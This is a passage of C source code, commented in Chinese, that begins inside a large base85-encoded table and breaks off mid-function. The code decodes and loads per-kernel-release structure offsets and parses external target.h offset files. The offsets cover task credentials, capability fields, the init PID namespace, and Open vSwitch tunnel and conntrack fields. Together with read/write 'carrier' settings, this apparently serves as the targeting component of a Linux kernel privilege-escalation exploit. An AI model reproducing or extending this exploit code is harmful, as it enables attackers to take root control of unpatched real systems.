    "cPOFfcA=V>B@?csMp+HZ%Y>E-^PQHZ3wRFfL|eG%_xDI5uB4Gypa(F*hzYEi*7ME@opiGcI^IHeWV005&c$H!e3VF)%PLW@9"
    "ulE_gULUp6!VHZCzYE;lVQFfcA=V>B`@csMp+HZ%Y>E-^PQH!U+TFfL|eG&3%EI5uB4Gypa(F*hzaD`aJ2F*7Y;ZDcky05&c"
    "$H!e6UWMyJ8Gc99mZ*^oXVQpkKGypa(F*hzaEio`KE@opiF)nyGHeWV005&c$H!e6WGB7YMW@9umE_gULUp6!VHZCzYE;ubS"
    "FfcA=V>B}^csMp+HZ%Y>E-^PQIV~|TFfL|eG%+rCI5uB4Gypa(F*hzbEiy1LE@opiGA?*HHeWV005&c$H!e9XGcYhNW@9unE"
    "_gULUp6!VHZCzYE;%hXHZV3ZH!wLZXJu|>a%p1#HZCzZE-^4IF)%PLW@9umE_gULUp6!VHZCzZE-^4IGB7YMW@9unE_gULUp"
    "6!VHZCzZE-^AIWMyJ8Gc93lWHvMaHZCzZE-^AIWMyJ8Gc99mZ*^oXVQpkKGypa(F*q(UGAnCgY-ufFZDcky05&c$I4&_VEio"
    "`KE@opiGA?*HHeWV005&c$I4&_VEiy1LE@opiGcI^IHeWV005&c$I4&_WEio`KE@opiGA?*HHeWV005&c$I4&_WEiy1LE@op"
    "iGcI^IHeWV005&c$I4&_YD`aJ2F*7Y;ZDcky05&c$I4&_YD`aJ2F*7Y=Y;SdBEn#hBHZ%Y>E-^SRF*YqRFfcA=V>B`@csMp+"
    "HZ%Y>E-^SRF*YqSFfcA=V>B}^csMp+HZ%Y>E-^SRGBPbNEp};gbO1IkF*q(WEio`KE@opiGA?*HHeWV005&c$I4(0SGB7YMW"
    "@9unE_gULUp6!VHZCzZE;BU%HZCzZE;BVPFfD9!a{x9jF*q(WH7zhLc4=~S05&c$I4(0bEif%?baMbUE-^SRGd3+SEp};gbO"
    "1IkF*q(WHZ3tNY;<z~HZCzZE;BYQHaRXaGdM0`ZF+7pFfubPcsMp+HZ%Y>E-^SRGdC?TEo^ji05&c$I4(0cEif&1X>xP`HZC"
    "zZE;Bd)HZCzZE;BeSFfD9!a{x9jF*q(WI4v+Oc4=~S05&c$I4(0dEjKeRF*7$VVQqSDGB7eTE_gULUp6!VHZCzZE;Bg*HZCz"
    "ZE;BhTFfD9!a{x9jF*q(WIV~_Pc4=~S05&c$I4(0eEoWtJbZ>7hWNCABEn;bI05&c$I4(3TF)%PLW@9umE_gULUp6!VHZCzZ"
    "E;KDNFfcA=V>B}^csMp+HZ%Y>E-^SRH7jIgVlgu<VQpkKGypa(F*q(YD`aJ2F*7Y=Y;SdBEn#hBHZ%Y>E-^SRH7zkPFfL|eG"
    "%_xDI5uB4Gypa(F*q(YEiy1LE@opiGcI^IHeWV005&c$I4(9VF)%PLW@9umE_gULUp6!VHZCzZE;cPPFfcA=V>B}^csMp+HZ"
    "%Y>E-^SRH!U$RFfL|eG%_xDI5uB4Gypa(F*q(aEiy1LE@opiGcI^IHeWV005&c$I4(FXF)%PLW@9umE_gULUp6!VHZCzZE;u"
    "bRFfcA=V>B}^csMp+HZ%Y>E-^SRIV)skVlgu<VQpkKGypa(F*q(cD`aJ2F*7Y=Y;SdBEn#hBHZ%Y>E-^SRIV~|TFfL|eG%_x"
    "DI5uB4Gypa(F*q(cEiy1LE@opiGcI^IHeWV005&c$IW93UD`aJ2F*7Y;ZDcky05&c$IW93UD`aJ2F*7Y=Y;SdBEn#hBHZ%Y>"
    "E-^VSF)%GLFfcA=V>B`@csMp+HZ%Y>E-^VSF)%GMFfcA=V>B}^csMp+HZ%Y>E-^VSF)%GNFfcA=V>C1_csMp+HZ%Y>E-^VSF"
    ")=G-WnwWiEn#hBHZ%Y>E-^VSF)=G-WnwWiEn{qNb!07JZDcky05&c$IW93VEio`KE@opiGA?*HHeWV005&c$IW93VEiy1LE@"
    "opiGcI^IHeWV005&c$IW93WEio`KE@opiGA?*HHeWV005&c$IW93WEiy1LE@opiGcI^IHeWV005&c$IW93XD`aJ2F*7Y;ZDc"
    "ky05&c$IW93XD`aJ2F*7Y=Y;SdBEn#hBHZ%Y>E-^VSF*7YOFfcA=V>B`@csMp+HZ%Y>E-^VSF*7YPFfcA=V>B}^csMp+HZ%Y"
    ">E-^VSF*GY=WnwWiEn#hBHZ%Y>E-^VSF*GY=WnwWiEn{qNb!07JZDcky05&c$IW93YEio`KE@opiGA?*HHeWV005&c$IW93Y"
    "Eio`LE@opiGA?*HHeWV005&c$IW93YEio`ME@opiGA?*HHeWV005&c$IW93YEio`OE@opiGA?*HHeWV005&c$IW93YEio`QE"
    "@opiGA?*HHeWV005&c$IW93YEio`RE@opiGA?*HHeWV005&c$IW93YEio`SE@opiGA?*HHeWV005&c$IW93YEiy1LE@opiGc"
    "I^IHeWV005&c$IW93YEi*7ME@opiG%k2JHeWV005&c$IW9IUWMyJ8Gc93lWHvMaHZCzaE;cJ<WnwWiEn{qNb!07JZDcky05&"
    "c$IW9IWF)%PLW@9umE_gULUp6!VHZCzaE;cPPFfcA=V>B}^csMp+HZ%Y>E-^VSH!U$RFfL|eG%_xDI5uB4Gypa(F*z<bEiy1"
    "LE@opiGcI^IHeWV005&c$IW9OWWMyJ8Gc93lWHvMaHZCzaE;uV>WnwWiEn{qNb!07JZDcky05&c$IW9OYF)%PLW@9umE_gUL"
    "Up6!VHZCzaE;ubRFfcA=V>B}^csMp+HZ%Y>E;cSPG&C(|Wo~qDZ!KhLb960YX>I^EE;cSXGypa(I4&?PF)%PKXJu|>a%p1#H"
    "ZC|WFfB1KF)e3hZe?<5V*oZTI4&?PF)%YWEn#|fa%BKEE;ueQEio`NH!W{+VPkA%05&c-E-)=IFf%wUZ*pN{Y-Ip8E;ueQEi"
    "o`NIW1v#a{x9jI4&?PF)%YZEpKvRV{ByrHZC|WFfB1KG%zh;cXI$XE;ueQEio`OFfCzvb#i3@HZC|WFfB1KG%zh^V{iaAE;u"
    "eQEio`OFfDI#VPkA%05&c-E-)=IFf=hOVRv%?HZC|WFfB1KG%+n<dUbMT05&c-E-)=IFf=hOXJc>xHZC|WFfB1KG%+o2a$#d"
    "^WdJrVI4&?PF)%bTEn#<a05&c-E-)=IFf=kPXJc>xHZC|WFfB1KG%_u3a$#d^WdJrVI4&?PF)%bUEn#<a05&c-E-)=IFf=nQ"
    "XJc>xHZC|WFfB1KG&3!4a$#d^WdJrVI4&?PF)%bVEn#<a05&c-E-)=IFf=qRVS06PWdJrVI4&?PF)%bVEoWnJ05&c-E-)=IF"
    "f=qRXKQ5uHZC|WFfB1KG&C)5a$#d^WdJrVI4&?PF)%bWEn#<a05&c-E-)=IFf=tSXJc>xHZC|WFfB1KG&U_^cXI$XE;ueQEi"
    "o`OHZ5U#b#i3@HZC|WFfB1KG&U_~V{iaAE;ueQEio`OH!Wdza{x9jI4&?PF)%bYEoWnJ05&c-E-)=IFf=zUZ*pN{Y-Ip8E;u"
    "eQEio`OI4x&mZ~!(gI4&?PF)%bZEoW<G05&c-E-)=IFf=(WXKQ5uHZC|WFfB1KG&wDAa$#d^WdJrVI4&?PF)%eSEn#<a05&c"
    "-E-)=IFf}kOXKQ5uHZC|WFfB1KH83r2a$#d^WdJrVI4&?PF)%eTEn#<a05&c-E-)=IFf}nPVS06PWdJrVI4&?PF)%eTEoW<G"
    "05&c-E-)=IFf}qQVRv%?HZC|WFfB1KH8L$>dUbMT05&c-E-)=IFf}qQXJc>xHZC|WFfB1KH8L%4a$#d^WdJrVI4&?PF)%eVE"
    "n#<a05&c-E-)=IFf}tRXJc>xHZC|WFfB1KH8d?@dUbMT05&c-E-)=IFf}wSXJc>xHZC|WFfB1KH8d?}Yh?g7E;ueQEio`PG%"
    "as(VPkA%05&c-E-)=IFf}zTVRv%?HZC|WFfB1KH8m|~V{iaAE;ueQEio`PH7#drWdJrVI4&?PF)%eYEn#|fa%BKEE;ueQEio"
    "`PH!Wdza{x9jI4&?PF)%eZEpKvRV{ByrHZC|WFfB1KH8?F{dUbMT05&c-E-)=IFf}+WXJc>xHZC|WFfB1KH8?G2Yh?g7E;ue"
    "QEio`PI4y5-VPkA%05&c-E-)=IFf}<XVS06PWdJrVI4&?PF)%ebEoW<G05&c-E-)=IFg7h`Wo~71X=4C3E;ueQEio`QFfCzs"
    "a{x9jI4&?PF)%hTEoWnJ05&c-E-)=IFg7tQVRv%?HZC|WFfB1KHZm<?dUbMT05&c-E-)=IFg7zSVS06PWdJrVI4&?PF)%hWE"
    "oWnJ05&c-E-)=IFg7$TXJc>xHZC|WFfB1KH!WvnZe?<5V*oZTI4&?PF)=VLXJu|>a%p1#HZC|WFfB1LF)e3hZe?<5V*oZTI4"
    "&?PF)=qSXJu|>a%p1#HZC|WFfB1MG%aUkZe?<5V*oZTI4&?PF*7tRXJu|>a%p1#HZC|WFfB1NHZ5mmZe?<5V*oZTI4&?PI5a"
    "J1Wo~71X=4C3E;ueQEjTqTXJu|>a%p1#HZC|WFfBMXEoWtJWpZg_05&c-E-)=PH!WvnZe?<5V*oZTI4&?PI5;h5Wo~71X=4C"
    "3E;ueQEjchPXJu|>a%p1#HZC|WFfBPWEoWtJWpZg_05>i$E-)=IFfcMLXKQ5uH!d(PFfB1KFf%P@V{iaBE-)@IEio`KGc9Lp"
    "WdJuWFfK4HF)%PQEpKvRV{ByrH!d(PFfB1KFf=V;cXI$YE-)@IEio`KG%aCzb#i3@H!d(PFfB1KFf}b_V{iaBE-)@IEio`KH"
    "7##)VPkA%05>i$E-)=IFfcYPVRv%?H!d(PFfB1KFg7h`V{iaBE-)@IEio`KHZ5;*VPkA%05>i$E-)=IFfcbQVRv%?H!d(PFf"
    "B1KFgGn>dUbMT05>i$E-)=IFfcbQXJc>xH!d(PFfB1KFgGo4a$#d^WdJuWFfK4HF)%PVEn#<a05>i$E-)=IFfceRVS06PWdJ"
    "uWFfK4HF)%PVEoWnJ05>i$E-)=IFfceRZ*pN{Y-Ip9E-)@IEio`KIW1v#a{xCkFfK4HF)%PWEn#|fa%BKFE-)@IEio`LFfCz"
    "vb#i3@H!d(PFfB1OEoWtJWpZg_05>i$E-)=IH7#dlZe?<5V*ocUFfK4HGBPb^Wo~71X=4C4E-)@IEiyMPXJu|>a%p1#H!d(P"
    "FfB4TEoWtJWpZg_05>i$E-^4GWMyJ8Gc93lWHvMaH!d(PF)%A+WnwWiEn{qNb!07JZDcky05>i$E-^4IF)%PLW@9unE_gULU"
    "p6!VH!d(PF)%GLFflG>V>B}^csMp+HZ%Y?E-)@JFfB4LFfL|eG&C-FI5uB4Gypd)FfK7LEiy1ME@opiG%k2JHeWV005>i$E-"
    "^7JF)d_eW?^+~bO1LlFfK7MEio`KE@opiGcI^IHeWV005>i$E-^7JGB7YMW@9uoE_gULUp6!VH!d(PF)=MSHZV6ZFflPLXJu"
    "|>a%p1#H!d(PF)}M;WnwWiEn#hBHZ%Y?E-)@JGAm?dVlgu<V{C7AWG!KBWHvMaH!d(PF)}SNEo5b8VRdYD05>i$E-^AKF)%P"
    "LW@9unE_gULUp6!VH!d(PF)}SNFflG>V>B}^csMp+HZ%Y?E-)@JGA%MNFfL|eG&C-FI5uB4Gypd)FfK7NEiy1ME@opiG%k2J"
    "HeWV005>i$E-^AKVRB<=F)c9wH!d(PF)}TBWo|JoF)ey!ZU8qfFfK7OD`aJ2F*7Y;ZDcky05>i$E-^DJWMyJ8Gc99mZ*^oXV"
    "QpkKGypd)FfK7OEio`KE@opiGcI^IHeWV005>i$E-^DLGB7YMW@9uoE_gULUp6!VH!d(PF*GePFflG>V>B}^csMp+HZ%Y?E-"
    ")@JG%YePF)n6fG&C-FI5uB4Gypd)FfKGJWMyJ8Gc93lWHvMaH!d(PG%I9fVlgu<V{C7AWG!KBWHvMaH!d(PG%YbOFfL|eG&3"
    "%EI5uB4Gypd)FfKGLGB7YMW@9uoE_gULUp6!VH!d(PHZ3tQFfL|eG&3%EI5uB4Gypd)FfKMNGB7YMW@9uoE_gULUp6!VH!d("
    "PH!EaiVlgu<VQpkKGypd)FfKPMWMyJ8Gc99mZ*^oXVQpkKGypd)FfKPOF)%PLW@9unE_gULUp6!VH!d(PH!U(SFfL|eG&C-F"
    "I5uB4Gypd)FfKSPF)%PLW@9unE_gULUp6!VH!d(PI4v?TFfL|eG&C-FI5uB4Gypd)FfKVOWMyJ8Gc93lWHvMaH!d(PIV)skV"
    "lgu<V{C7AWG!KBWHvMaH!d(PIV~|TGA?FgG&3%EI5uB4Gypd)FfKVQF)%bPW@9unE_gULUp6!VH!d(PIV~|TH7;gjG&3%EI5"
    "uB4Gypd)FfKVQGB7eOW@9uoE_gULUp6!VH!d(PIW00UG%jXiG&C-FI5uB4Gypd)FfKVQGB7nRW@9uoE_gULUp6!VH!d+QFfD"
    "RpHZ68&05>i%E-)=}V>c~!XaF}ZF)lJKF)d_eW?^+~bO1LlF)lMJWMyJ8Gc93lWHvMaH!d+QGb?0eVlgu<V{C7AWG!KBWHvM"
    "aH!d+QGc7SNFfL|eG&3%EI5uB4Gypd)F)lMLF)%SMW@9unE_gULUp6!VH!d+QGc7VOFfL|eG&C-FI5uB4Gypd)F)lMLGB7bN"
    "W@9uoE_gULUp6!VH!d+QG%YbOFfL|eG&3%EI5uB4Gypd)F)lPMF)%VNW@9unE_gULUp6!VH!d+QG%YbOG%jXiG&3%EI5uB4G"
    "ypd)F)lPMGB7eOW@9uoE_gULUp6!VH!d+QG%YePG%jXiG&C-FI5uB4Gypd)F)lPMXkl_>Wo~6;F)cAIXkl_>Wo~6;00";
/* END KREC */

static unsigned krec_u16(const unsigned char *p)
{
    return (unsigned)p[0] | ((unsigned)p[1] << 8);
}

static unsigned long krec_u32(const unsigned char *p)
{
    return (unsigned long)p[0] | ((unsigned long)p[1] << 8) |
           ((unsigned long)p[2] << 16) | ((unsigned long)p[3] << 24);
}

static unsigned long fnv1a32(const char *s)
{
    unsigned long h = 0x811C9DC5UL;

    while (*s) {
        h ^= (unsigned char)*s++;
        h = (h * 0x01000193UL) & 0xFFFFFFFFUL;
    }
    return h;
}

/* Python base64.b85encode 的字母表（不是连续的 ASCII 33..117） */
static const char krec_b85_alpha[] =
    "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
    "!#$%&()*+-;<=>?@^_`{|}~";

static int krec_b85_val(int c)
{
    const char *p = strchr(krec_b85_alpha, c);

    return (p && c) ? (int)(p - krec_b85_alpha) : -1;
}

static int krec_decode_b85(const char *in, size_t len,
                           unsigned char **out, size_t *outlen)
{
    size_t groups = (len + 4) / 5;
    unsigned char *buf;
    size_t gi;

    if (!len || groups > (size_t)1 << 22)
        return -1;
    buf = malloc(groups * 4 + 4);
    if (!buf)
        return -1;

    for (gi = 0; gi < groups; gi++) {
        unsigned long acc = 0;
        int k;

        for (k = 0; k < 5; k++) {
            size_t pos = gi * 5 + (size_t)k;
            int c = (pos < len) ? (unsigned char)in[pos] : 'u';
            int v = krec_b85_val(c);

            if (v < 0) {
                free(buf);
                return -1;
            }
            acc = acc * 85 + (unsigned long)v;
        }
        buf[gi * 4 + 0] = (unsigned char)(acc >> 24);
        buf[gi * 4 + 1] = (unsigned char)(acc >> 16);
        buf[gi * 4 + 2] = (unsigned char)(acc >> 8);
        buf[gi * 4 + 3] = (unsigned char)acc;
    }

    *out = buf;
    *outlen = len * 4 / 5;
    return 0;
}

static int krec_load(struct krec *t)
{
    unsigned char *raw = NULL;
    const unsigned char *p, *end;
    size_t len = 0;
    unsigned i;

    if (t->state > 0)
        return 0;
    if (t->state < 0)
        return -1;
    t->state = -1;

    if (krec_decode_b85(krec_b85, KREC_B85_LEN, &raw, &len) != 0)
        return -1;
    if (len < 16 || memcmp(raw, "OKR1", 4) != 0)
        goto bad;

    t->n_rec = krec_u16(raw + 4);
    t->n_off = krec_u16(raw + 6);
    t->n_combo = krec_u16(raw + 8);
    if (krec_u16(raw + 10) != 1)
        goto bad;
    t->pool_len = (size_t)krec_u32(raw + 12);

    p = raw + 16;
    end = raw + len;
    if (!t->n_rec || t->n_off > 8192 || t->n_combo > 8192)
        goto bad;
    if ((size_t)(end - p) < (size_t)t->n_off * KREC_OFF_STRIDE)
        goto bad;
    t->off_tab = p;
    p += (size_t)t->n_off * KREC_OFF_STRIDE;

    t->combo_tab = p;
    for (i = 0; i < t->n_combo; i++) {
        size_t sz;

        if (p + 4 > end)
            goto bad;
        sz = 4 + (size_t)p[3];
        if (p + sz > end)
            goto bad;
        p += sz;
    }

    if ((size_t)(end - p) < (size_t)t->n_rec * KREC_REC_STRIDE)
        goto bad;
    t->rec_tab = p;
    p += (size_t)t->n_rec * KREC_REC_STRIDE;

    if ((size_t)(end - p) < t->pool_len)
        goto bad;
    t->pool = (const char *)p;

    t->storage = raw;
    t->state = 1;
    return 0;

bad:
    free(raw);
    return -1;
}

static int krec_lookup(struct krec *t, const char *release, unsigned long vhash,
                       int *exact)
{
    unsigned i;
    int first = -1;

    *exact = 0;
    for (i = 0; i < t->n_rec; i++) {
        const unsigned char *rec = t->rec_tab + (size_t)i * KREC_REC_STRIDE;
        size_t off = (size_t)krec_u32(rec);
        const char *name;

        if (off >= t->pool_len)
            continue;
        name = t->pool + off;
        if (strnlen(name, t->pool_len - off) == t->pool_len - off)
            continue;
        if (strcmp(name, release))
            continue;
        if (krec_u32(rec + 4) == vhash) {
            *exact = 1;
            return (int)i;
        }
        if (first < 0)
            first = (int)i;
    }
    return first;
}

/* 字段顺序必须与 tools/gen_krec_table.py 的 LAYOUT_FIELDS 一致 */
static void krec_apply_offsets(const struct krec *t, unsigned idx, struct koffs *k)
{
    const unsigned char *o = t->off_tab + (size_t)idx * KREC_OFF_STRIDE;

    k->nf_conntrack_helper_me = (int)krec_u16(o + 0);
    k->module_kobj_ktype = (int)krec_u16(o + 2);
    k->task_pid = (int)krec_u16(o + 4);
    k->task_cred = (int)krec_u16(o + 6);
    k->task_pid_links = (int)krec_u16(o + 8);
    k->cred_fsuid = (int)krec_u16(o + 10);
    k->cred_fsgid = (int)krec_u16(o + 12);
    k->cred_cap_permitted = (int)krec_u16(o + 14);
    k->cred_cap_effective = (int)krec_u16(o + 16);
    k->pid_namespace_idr = (int)krec_u16(o + 18);
    k->idr_idr_rt = (int)krec_u16(o + 20);
    k->idr_base = (int)krec_u16(o + 22);
    k->xarray_xa_head = (int)krec_u16(o + 24);
    k->xa_node_shift = (int)krec_u16(o + 26);
    k->xa_node_slots = (int)krec_u16(o + 28);
    k->pid_tasks = (int)krec_u16(o + 30);
    k->hlist_head_first = (int)krec_u16(o + 32);
    k->dst_entry_ref = (int)krec_u16(o + 34);
    k->metadata_dst_tun_info = (int)krec_u16(o + 36);
    k->ip_tunnel_key_ipv4_src = (int)krec_u16(o + 38);
    k->ip_tunnel_key_ipv4_dst = (int)krec_u16(o + 40);
    k->ip_tunnel_key_tos = (int)krec_u16(o + 42);
    k->ip_tunnel_key_ttl = (int)krec_u16(o + 44);
    k->ip_tunnel_key_tp_src = (int)krec_u16(o + 46);
    k->ip_tunnel_key_tp_dst = (int)krec_u16(o + 48);
    k->ovs_ct_labels = (int)krec_u16(o + 50);
    k->ovs_ct_action_len = (int)krec_u16(o + 52);
    k->vmlinux_module_ktype = krec_u32(o + 54);
    k->vmlinux_init_pid_ns = krec_u32(o + 58);
    k->ref_kind = (o[62] == 0) ? 0 : 1;
}

static void krec_apply_combo(const struct krec *t, unsigned idx)
{
    const unsigned char *c = t->combo_tab;
    unsigned i;

    for (i = 0; i < idx; i++)
        c += 4 + (size_t)c[3];

    g_krec_hit.read_carrier = c[0];
    g_krec_hit.write_carrier = c[1];
    g_krec_hit.tunnel_info = c[2];
    g_krec_hit.lane_count = c[3] > KREC_LANE_MAX ? KREC_LANE_MAX : c[3];
    for (i = 0; i < (unsigned)g_krec_hit.lane_count; i++)
        g_krec_hit.lane_order[i] = c[4 + i];
}

/* 未收录时给点线索：同系列（X.Y）有哪些记录，可用 -krec 手动指定 */
static void krec_hint(struct krec *t, const char *release)
{
    char prefix[16];
    const char *dot;
    const char *sample[3];
    unsigned i, total = 0, shown = 0;
    size_t plen;

    dot = strchr(release, '.');
    dot = dot ? strchr(dot + 1, '.') : NULL;
    if (!dot)
        return;
    plen = (size_t)(dot - release);
    if (plen >= sizeof(prefix))
        return;
    memcpy(prefix, release, plen);
    prefix[plen] = '\0';

    for (i = 0; i < t->n_rec; i++) {
        const unsigned char *rec = t->rec_tab + (size_t)i * KREC_REC_STRIDE;
        size_t off = (size_t)krec_u32(rec);
        const char *name;

        if (off >= t->pool_len)
            continue;
        name = t->pool + off;
        if (strncmp(name, prefix, plen) || name[plen] != '.')
            continue;
        total++;
        if (shown < 3)
            sample[shown++] = name;
    }
    if (!total)
        return;

    pr_dim("    表里有 %u 条 %s.x 记录，例如：", total, prefix);
    for (i = 0; i < shown; i++)
        pr_raw("%s%s", i ? "、" : "", sample[i]);
    pr_raw("%s\n", shown < total ? " …" : "");
    pr_dim("    结构体没变的话可以用 -krec <release> 手动指定其中一条。\n");
}

/* -------------------------------------------------------------------------
 * 外部配置表：offset/<N>系/<release>/target.h
 *
 * 内嵌的 808 条是存量发行版数据。新增内核不必再重编二进制，直接建目录：
 *
 *     offset/5系/5.8.0-59-generic/target.h
 *
 * target.h 就是一组 #define，程序逐行解析；它同时也是合法 C 头文件，
 * 想静态编译进去 #include 即可。查找顺序（先命中者胜）：
 *
 *   -offset <dir> > $OVSWRAP_OFFSET_DIR > <可执行文件目录>/offset
 *   > ./offset > /usr/share/dirtyfrag/offset > 内嵌表 > 动态推导
 * ---------------------------------------------------------------------- */

#define KREC_NLANES 14

static const char *const krec_lane_names[KREC_NLANES] = {
    "tos", "ttl", "tp_src_0", "tp_src_1", "tp_dst_0", "tp_dst_1",
    "ipv4_src_0", "ipv4_src_1", "ipv4_src_2", "ipv4_src_3",
    "ipv4_dst_0", "ipv4_dst_1", "ipv4_dst_2", "ipv4_dst_3",
};

/* 本次运行最终用的配置来源，给 -v 和报错信息用 */
static char g_krec_src[600];
static const char *g_offset_dir;          /* -offset <dir> */

struct th_key {
    const char *name;                     /* target.h 里的宏名 */
    size_t off;                           /* offsetof(struct koffs, ...) */
    int ulong;                            /* 1 = unsigned long */
};

#define TH_I(n, f) { "KREC_" #n, offsetof(struct koffs, f), 0 }
#define TH_U(n, f) { "KREC_" #n, offsetof(struct koffs, f), 1 }

static const struct th_key th_keys[] = {
    TH_U(VMLINUX_MODULE_KTYPE, vmlinux_module_ktype),
    TH_U(VMLINUX_INIT_PID_NS, vmlinux_init_pid_ns),
    TH_I(NF_CONNTRACK_HELPER_ME, nf_conntrack_helper_me),
    TH_I(MODULE_KOBJ_KTYPE, module_kobj_ktype),
    TH_I(TASK_PID, task_pid),
    TH_I(TASK_CRED, task_cred),
    TH_I(TASK_PID_LINKS, task_pid_links),
    TH_I(CRED_FSUID, cred_fsuid),
    TH_I(CRED_FSGID, cred_fsgid),
    TH_I(CRED_CAP_PERMITTED, cred_cap_permitted),
    TH_I(CRED_CAP_EFFECTIVE, cred_cap_effective),
    TH_I(PID_NAMESPACE_IDR, pid_namespace_idr),
    TH_I(IDR_IDR_RT, idr_idr_rt),
    TH_I(IDR_BASE, idr_base),
    TH_I(XARRAY_XA_HEAD, xarray_xa_head),
    TH_I(XA_NODE_SHIFT, xa_node_shift),
    TH_I(XA_NODE_SLOTS, xa_node_slots),
    TH_I(PID_TASKS, pid_tasks),
    TH_I(HLIST_HEAD_FIRST, hlist_head_first),
    TH_I(DST_ENTRY_REF, dst_entry_ref),
    TH_I(METADATA_DST_TUN_INFO, metadata_dst_tun_info),
    TH_I(IP_TUNNEL_KEY_IPV4_SRC, ip_tunnel_key_ipv4_src),
    TH_I(IP_TUNNEL_KEY_IPV4_DST, ip_tunnel_key_ipv4_dst),
    TH_I(IP_TUNNEL_KEY_TOS, ip_tunnel_key_tos),
    TH_I(IP_TUNNEL_KEY_TTL, ip_tunnel_key_ttl),
    TH_I(IP_TUNNEL_KEY_TP_SRC, ip_tunnel_key_tp_src),
    TH_I(IP_TUNNEL_KEY_TP_DST, ip_tunnel_key_tp_dst),
    TH_I(OVS_CT_LABELS, ovs_ct_labels),
    TH_I(OVS_CT_ACTION_LEN, ovs_ct_action_len),
};

#undef TH_I
#undef TH_U

#define TH_KEY_MAX (int)(sizeof(th_keys) / sizeof(th_keys[0]))

/* 把块注释与行注释清成空格，字符串字面量里的斜杠不动 */
static void th_strip_comments(char *s)
{
    int in_str = 0, in_cmt = 0, in_line = 0;
    char *p = s;

    while (*p) {
        if (in_cmt) {
            if (p[0] == '*' && p[1] == '/') {
                p[0] = ' ';
                p[1] = ' ';
                p += 2;
                in_cmt = 0;
                continue;
            }
            if (*p != '\n')
                *p = ' ';
            p++;
            continue;
        }
        if (in_line) {
            if (*p == '\n')
                in_line = 0;
            else
                *p = ' ';
            p++;
            continue;
        }
        if (in_str) {
            if (*p == '\\' && p[1]) {
                p += 2;
                continue;
            }
            if (*p == '"')
                in_str = 0;
            p++;
            continue;
        }
        if (*p == '"') {
            in_str = 1;
            p++;
            continue;
        }
        if (p[0] == '/' && p[1] == '*') {
            p[0] = ' ';
            p[1] = ' ';
            p += 2;
            in_cmt = 1;
            continue;
        }
        if (p[0] == '/' && p[1] == '/') {
            *p = ' ';
            p++;
            in_line = 1;
            continue;
        }
        p++;
    }
}

static int th_lane_id(const char *name, size_t len)
{
    int i;

    for (i = 0; i < KREC_NLANES; i++)
        if (strlen(krec_lane_names[i]) == len &&
            !strncmp(krec_lane_names[i], name, len))
            return i;
    return -1;
}

/* "tos, ttl ,tp_src_0" -> lane_order[] */
static int th_parse_lanes(char *val, struct krec_hit *hit)
{
    char *p = val;

    hit->lane_count = 0;
    while (*p && hit->lane_count < KREC_NLANES) {
        char *e = strchr(p, ',');
        char *end = e ? e : p + strlen(p);
        char *b = p;
        int id;

        while (b < end && isspace((unsigned char)*b))
            b++;
        while (end > b && isspace((unsigned char)end[-1]))
            end--;
        if (end == b)
            break;
        id = th_lane_id(b, (size_t)(end - b));
        if (id < 0)
            return -1;
        hit->lane_order[hit->lane_count++] = id;
        if (!e)
            break;
        p = e + 1;
    }
    return hit->lane_count ? 0 : -1;
}

/*
 * 解析一张 target.h。成功返回 0，偏移写进 k，行为参数写进 g_krec_hit。
 * rel 回传文件里写的 release（可能和本机不同，属于借用）。
 */
static int th_load(const char *path, struct koffs *k, char *rel, size_t relsz)
{
    FILE *f;
    char line[512];
    char version[256] = "";
    unsigned long vhash = 0;
    int seen = 0, i;
    struct utsname u;

    f = fopen(path, "r");
    if (!f)
        return -1;

    memset(k, 0, sizeof(*k));
    memset(&g_krec_hit, 0, sizeof(g_krec_hit));
    rel[0] = 0;

    while (fgets(line, sizeof(line), f)) {
        char *p = line, *key, *val, *end;

        th_strip_comments(p);
        while (isspace((unsigned char)*p))
            p++;
        if (strncmp(p, "#define", 7) != 0)
            continue;
        p += 7;
        if (*p && !isspace((unsigned char)*p))
            continue;
        while (isspace((unsigned char)*p))
            p++;
        if (!*p)
            continue;

        key = p;
        while (*p && !isspace((unsigned char)*p))
            p++;
        if (!*p)
            continue;                    /* 无值宏，例如 #define TARGET_H */
        *p++ = 0;
        while (isspace((unsigned char)*p))
            p++;
        val = p;
        end = val + strlen(val);
        while (end > val && isspace((unsigned char)end[-1]))
            *--end = 0;
        if (end == val)
            continue;

        if (*val == '"') {               /* 字符串值去掉两侧引号 */
            val++;
            if (end > val && end[-1] == '"')
                end[-1] = 0;
        }

        if (!strcmp(key, "KREC_RELEASE")) {
            snprintf(rel, relsz, "%s", val);
            continue;
        }
        if (!strcmp(key, "KREC_VERSION")) {
            snprintf(version, sizeof(version), "%s", val);
            continue;
        }
        if (!strcmp(key, "KREC_VERSION_HASH")) {   /* 表里只存得下哈希时用 */
            vhash = strtoul(val, NULL, 0);
            continue;
        }
        if (!strcmp(key, "KREC_READ_CARRIER")) {
            g_krec_hit.read_carrier = !strcmp(val, "labels-only")
                                      ? CARRIER_LABELS_ONLY : CARRIER_TIMEOUT;
            seen++;
            continue;
        }
        if (!strcmp(key, "KREC_WRITE_CARRIER")) {
            g_krec_hit.write_carrier = !strcmp(val, "labels-only")
                                       ? CARRIER_LABELS_ONLY : CARRIER_TIMEOUT;
            seen++;
            continue;
        }
        if (!strcmp(key, "KREC_TUNNEL_INFO")) {
            g_krec_hit.tunnel_info = atoi(val);
            seen++;
            continue;
        }
        if (!strcmp(key, "KREC_REF_KIND")) {
            k->ref_kind = !strcmp(val, "__refcnt") ? 1 : 0;
            seen++;
            continue;
        }
        if (!strcmp(key, "KREC_READ_LANES")) {
            if (th_parse_lanes(val, &g_krec_hit) != 0) {
                fclose(f);
                return -1;
            }
            seen++;
            continue;
        }

        for (i = 0; i < TH_KEY_MAX; i++) {
            unsigned long v;

            if (strcmp(key, th_keys[i].name))
                continue;
            v = strtoul(val, NULL, 0);
            if (th_keys[i].ulong)
                *(unsigned long *)((char *)k + th_keys[i].off) = v;
            else
                *(int *)((char *)k + th_keys[i].off) = (int)v;
            seen++;
            break;
        }
    }
    fclose(f);

    if (seen < 20)                       /* 空文件 / 半截 / 键名写错 */
        return -1;

    /* 这几项缺了就没法用，直接判为无效表 */
    if (!k->task_pid || !k->task_cred || !k->cred_fsuid ||
        !k->vmlinux_module_ktype || !k->vmlinux_init_pid_ns)
        return -1;

    g_krec_hit.hit = 1;
    g_krec_hit.exact = 0;
    if (uname(&u) == 0 && !strcmp(rel, u.release)) {
        if (version[0] && !strcmp(version, u.version))
            g_krec_hit.exact = 1;
        else if (!version[0] && vhash && vhash == fnv1a32(u.version))
            g_krec_hit.exact = 1;        /* 只有哈希也比 release 可靠 */
    }
